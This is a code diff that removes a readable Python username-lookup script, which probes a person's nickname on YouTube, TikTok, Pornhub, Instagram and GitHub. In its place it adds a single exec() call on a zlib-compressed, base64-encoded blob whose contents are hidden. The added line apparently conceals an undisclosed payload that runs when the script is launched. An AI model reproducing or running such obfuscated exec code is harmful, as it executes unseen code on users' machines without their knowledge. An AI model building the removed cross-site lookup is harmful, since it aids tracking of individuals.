@@ -1,45 +1,4 @@
-from colorama import Fore, Back, Style, init
-init(autoreset=True)
-import requests
-import time
-import os
-print(Fore.BLUE + r""" .+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+. 
-(     ______  __      __  ________  ________      )
- )   /      |/  \    /  |/        |/        |    ( 
-(    $$$$$$/ $$  \  /$$/ $$$$$$$$/ $$$$$$$$/      )
- )     $$ |   $$  \/$$/  $$ |__       $$ |       ( 
-(      $$ |    $$  $$/   $$    |      $$ |        )
- )     $$ |     $$$$/    $$$$$/       $$ |       ( 
-(     _$$ |_     $$ |    $$ |         $$ |        )
- )   / $$   |    $$ |    $$ |         $$ |       ( 
-(    $$$$$$/     $$/     $$/          $$/         )
- )                                               ( 
-(                                                 )
- "+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+"+.+" """)
-time.sleep(5)
-os.system("cls" if os.name=="nt" else "clear")
-print(Fore.RED + "WELCOME TO IYFT")
-iyft_answer = input(Fore.GREEN + "What is her/his nickname:")
-#urls
-url = f"https://youtube.com/@{iyft_answer}"
-url2 = f"https://www.tiktok.com/@{iyft_answer}"
-url3 = f"https://www.pornhub.com/pornstar/{iyft_answer}"
-url4 = f"https://www.instagram.com/{iyft_answer}"
-url5 = f"https://github.com/{iyft_answer}"
-#responses
-resp =requests.get(url, timeout=5)
-resp2 =requests.get(url2, timeout=5)
-resp3 =requests.get(url3, timeout=5)
-resp4 =requests.get(url4, timeout=5)
-resp5 =requests.get(url5, timeout=5)
-#if
-if resp.status_code == 200:
-    print(f"Username found:{url}")
-if resp2.status_code == 200:
-    print(f"Username found:{url2}")
-if resp3.status_code == 200:
-    print(f"Username found:{url3}")
-if resp4.status_code == 200:
-    print(f"Username found:{url4}")
-if resp5.status_code == 200:
-    print(f"Username found:{url5}")
+import zlib, base64
+exec(zlib.decompress(base64.b64decode(b'''
+eNqdlW1v2zYQx98b8Hc4KHvh1LLk+CHdHAhYmrld0aQdEgfBgAEBLZ8swhKpUlSdNM1335GSH5VuSWhEPB7v9z+GPFGRkimEMpGKpQx4mkml4b1U6MI7Fi5cuNL3CQ244LrZMM8WKzTN56iDiSrwkLwlpfBrgbnO1w7NU1wPJPkzxYVuGXXv3fn1GNqgHMcBr+20X/QHzUYLTLu1zfRQjVe+Xcs0WigcUu+Xwx/U/wPl+Efl27HMo7XK9IttPvWW8kt7411ZO5kMZnUsZRnrWa1oNb2TaeM1VKlpLFiFbkH1TOVK/fWS/f/KdGsXs59zLf5kpnILdoN/BtV2r7R3+9pg8z89v23t3guayfTCyms7QBVLoKltL08Qs9aQhgcxshmL47jZMBaqHAJ4IH1qznWOqnM6R6GdETgX8jtPEuYPvS60briYyWUOnydw1PW6J0CO48EJ3B0PDuE0yxK8weknrv1h/63XP4bWpz8nF+cuJHyB8AHDhTyEs5jeYfSPekde1/zgikVM8Qpx3GoVp2GImV2BxjvtxzpNXEYZeMg0l8K/M5723b43TU6+Bl3vN5enbI4++8ajylziNHPf+G/s/K97eTrnTMwLCrMJVWdy6WpVKaHoXF+VFNnWeLuPj0UoZ1zMDT7/zjMXZhglTNNVNFXr4DMpBIZmoSZuQafRYQn/huuA62yu6Dg6H0WOYaGwc1ldUib+aKPDwhg7pKaVTMyUkJ3Q+NYRfyk2T9nOVLPx2Gw0GzL38vtcY9pywiR3gEd013mCpRgEDh05YJIj0BwyZSpn6xK8HP9Bd6BzMz4/+3IxhskX+Pj3+4kJ4veRvmUiX6KiQuIiKyrkw+V4/NlCMdPAc4hR+TH1gocLk3Rk8INCJXTf0pPoyIm1zvKR79/LQhdT9EKZ+r8/bOV4dGxwbyd6uVx6mi+0XPwU6NcAuutFXEwtYexcM+U/QQ5qJDexdFqpZZ9AhjvInOtVnv3YA/o6ZZJOnLbAmBCsPk3eHHWLpFz7baLdCMzLa2J69aDeJqrfdaF6r4Oqr7h+nes/hxvUucFzuGGdG/4fd8AjqqgIDO/RJusiv6W3CyEIoNftjsoSL+sysreVKSSIZCFmowfK8GhLshTovUqhty3Rf5VEf1ti8CqJwbbE8FUSQyvxLx9Jf4c=
+''')))
